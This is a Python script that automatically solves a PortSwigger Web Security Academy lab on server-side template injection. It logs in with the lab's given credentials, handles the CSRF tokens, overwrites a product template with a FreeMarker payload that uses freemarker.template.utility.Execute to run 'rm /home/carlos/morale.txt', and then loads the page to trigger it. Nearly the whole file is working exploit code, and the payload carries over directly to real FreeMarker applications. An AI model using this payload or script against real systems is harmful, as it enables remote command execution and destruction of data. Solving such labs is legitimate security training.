#!/usr/bin/env python3
"""
PortSwigger SSTI Lab Solver - BASED ON ACTUAL HTML
Lab: Server-side template injection using documentation
Credentials: content-manager:C0nt3ntM4n4g3r
Target: Delete /home/carlos/morale.txt
"""

import requests
import sys
import re
from colorama import init, Fore, Style
from bs4 import BeautifulSoup
import time

# Initialize colorama
init()

class HTMLBasedSolver:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        })
        self.csrf_token = None
        self.logged_in = False
        self.solved = False
        
    def print_status(self, message, status="info"):
        """Print colored status messages"""
        colors = {
            "info": Fore.CYAN,
            "success": Fore.GREEN,
            "error": Fore.RED,
            "warning": Fore.YELLOW,
            "step": Fore.MAGENTA
        }
        print(f"{colors.get(status, Fore.WHITE)}[*] {message}{Style.RESET_ALL}")
        time.sleep(0.5)

    def extract_csrf(self, html_content):
        """Extract CSRF token from HTML"""
        soup = BeautifulSoup(html_content, 'html.parser')
        csrf_input = soup.find('input', {'name': 'csrf'})
        if csrf_input:
            return csrf_input.get('value')
        return None

    def login(self):
        """Step 1: Login with provided credentials"""
        self.print_status("STEP 1: Logging in...", "step")
        
        login_url = f"{self.base_url}/login"
        
        # Get login page for CSRF token
        response = self.session.get(login_url)
        self.csrf_token = self.extract_csrf(response.text)
        
        if not self.csrf_token:
            self.print_status("Could not find CSRF token", "error")
            return False
        
        # Perform login
        login_data = {
            'csrf': self.csrf_token,
            'username': 'content-manager',
            'password': 'C0nt3ntM4n4g3r'
        }
        
        response = self.session.post(login_url, data=login_data, allow_redirects=True)
        
        # Verify login success
        if "content-manager" in response.text.lower() or "my-account" in response.text.lower():
            self.logged_in = True
            self.print_status("✓ Login successful!", "success")
            return True
        else:
            self.print_status("✗ Login failed", "error")
            return False

    def access_template_editor(self):
        """Step 2: Access the template editor for productId=1"""
        self.print_status("\nSTEP 2: Accessing template editor...", "step")
        
        # Visit product page first to establish context
        product_url = f"{self.base_url}/product?productId=1"
        self.print_status(f"Visiting product page: {product_url}", "info")
        self.session.get(product_url)
        
        # Access template editor
        template_url = f"{self.base_url}/product/template?productId=1"
        self.print_status(f"Accessing template editor: {template_url}", "info")
        
        response = self.session.get(template_url)
        
        if response.status_code != 200:
            self.print_status(f"Failed to access (Status: {response.status_code})", "error")
            return None
        
        self.print_status("✓ Template editor accessed", "success")
        return response.text

    def inject_and_save_payload(self, html_content):
        """
        Step 3: Inject payload and click Save button
        Following user's exact instructions:
        - Delete everything in preview-result
        - Paste payload
        - Save template
        - Refresh
        """
        self.print_status("\nSTEP 3: Injecting payload...", "step")
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Extract CSRF token from the template editor page
        csrf_input = soup.find('input', {'name': 'csrf'})
        if not csrf_input:
            self.print_status("Could not find CSRF token in template editor", "error")
            return False
        
        csrf_token = csrf_input.get('value')
        self.print_status(f"CSRF token: {csrf_token}", "info")
        
        # The Freemarker payload to delete morale.txt
        payload = '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm /home/carlos/morale.txt")}'
        self.print_status(f"Payload prepared", "info")
        
        # Prepare form data for SAVE action (not preview)
        form_data = {
            'csrf': csrf_token,
            'template': payload,  # Replace entire template with our payload
            'template-action': 'save'  # Click the Save button
        }
        
        # Submit to the same URL (form action is empty)
        submit_url = f"{self.base_url}/product/template?productId=1"
        self.print_status(f"Submitting to: {submit_url}", "info")
        self.print_status("Clicking 'Save' button...", "info")
        
        # Submit the form
        response = self.session.post(submit_url, data=form_data, allow_redirects=True)
        
        self.print_status(f"Response status: {response.status_code}", "info")
        
        if response.status_code in [200, 302]:
            self.print_status("✓ Template saved successfully!", "success")
            
            # Now visit the product page to trigger the template
            product_url = f"{self.base_url}/product?productId=1"
            self.print_status(f"Visiting product page to trigger payload: {product_url}", "info")
            response = self.session.get(product_url)
            
            return True
        else:
            self.print_status(f"Save failed with status: {response.status_code}", "error")
            return False

    def verify_solution(self):
        """Step 4: Verify if lab is solved"""
        self.print_status("\nSTEP 4: Verifying if lab is solved...", "step")
        
        # Check main page for solved indicator
        response = self.session.get(self.base_url)
        
        # Look for solved indicator
        if "congratulations" in response.text.lower() or "solved" in response.text.lower():
            self.solved = True
            self.print_status("🎉 LAB IS SOLVED! 🎉", "success")
            
            # Extract success message
            soup = BeautifulSoup(response.text, 'html.parser')
            lab_status = soup.find('div', {'class': 'widgetcontainer-lab-status'})
            if lab_status and 'solved' in lab_status.get('class', []):
                self.print_status("✓ Lab status shows as solved", "success")
            
            return True
        
        # Check if the file might be deleted (look for error messages)
        if "morale.txt" not in response.text:
            self.print_status("'morale.txt' not found in response", "info")
        
        self.print_status("✗ Lab not solved yet", "error")
        return False

    def run(self):
        """Main execution flow"""
        print(Fore.CYAN + """
╔══════════════════════════════════════════════════════════════╗
║     SSTI LAB SOLVER - HTML-BASED VERSION                    ║
║     Lab: Server-side template injection using documentation ║
║     Target: {}    ║
║     Based on actual HTML structure provided                 ║
╚══════════════════════════════════════════════════════════════╝
""".format(self.base_url) + Style.RESET_ALL)

        # Step 1: Login
        if not self.login():
            self.print_status("Cannot proceed without login", "error")
            return False

        # Step 2: Access template editor
        html_content = self.access_template_editor()
        if not html_content:
            self.print_status("Cannot proceed without template editor", "error")
            return False

        # Step 3: Inject payload and save
        if not self.inject_and_save_payload(html_content):
            self.print_status("Payload injection failed", "error")
            return False

        # Step 4: Wait and verify
        time.sleep(3)
        solved = self.verify_solution()

        # Final summary
        print(Fore.CYAN + "\n" + "=" * 60 + Style.RESET_ALL)
        if solved:
            print(Fore.GREEN + """
    ✅ LAB SOLVED SUCCESSFULLY!

    The file /home/carlos/morale.txt has been deleted.

    Exploit chain:
    1. Logged in as content-manager
    2. Accessed template editor at /product/template?productId=1
    3. Replaced template with Freemarker RCE payload
    4. Clicked Save button (template-action=save)
    5. Visited product page to trigger payload
    6. Lab marked as solved

    Payload used:
    <#assign ex="freemarker.template.utility.Execute"?new()>
    ${ex("rm /home/carlos/morale.txt")}
    """ + Style.RESET_ALL)
        else:
            print(Fore.RED + """
    ❌ LAB NOT SOLVED!

    Debug information:
    - Template editor accessed: ✓
    - CSRF token extracted: ✓
    - Save button clicked: ✓
    - Product page triggered: ✓
    - Lab status: Not solved

    Please check manually:
    1. Go to: {}/product?productId=1
    2. Look for the "Edit template" link
    3. Verify the template was replaced with the payload
    4. Check if any errors appear
    """.format(self.base_url) + Style.RESET_ALL)
        
        return solved

if __name__ == "__main__":
    if len(sys.argv) > 1:
        lab_url = sys.argv[1]
    else:
        lab_url = input("Enter PortSwigger lab URL: ").strip()
    
    if not lab_url:
        print("No URL provided. Exiting.")
        sys.exit(1)
    
    try:
        solver = HTMLBasedSolver(lab_url)
        success = solver.run()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
